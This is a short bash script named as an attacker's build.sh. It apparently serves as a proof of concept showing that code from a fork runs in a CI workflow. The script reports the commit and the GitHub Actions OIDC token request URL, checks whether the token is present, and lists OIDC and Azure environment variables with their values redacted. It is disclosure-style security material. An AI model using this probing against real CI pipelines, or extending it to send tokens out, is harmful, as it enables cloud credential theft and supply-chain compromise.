#!/bin/bash
echo "=== ATTACKER build.sh RAN — fork code executed ==="
echo "HEAD: $(git rev-parse HEAD 2>/dev/null)"
echo "OIDC_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:-UNSET}"
echo "OIDC_TOKEN_SET: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
env | grep -i -E 'oidc|azure' | sed 's/=.*/=REDACTED/'
git log --oneline -3 2>/dev/null
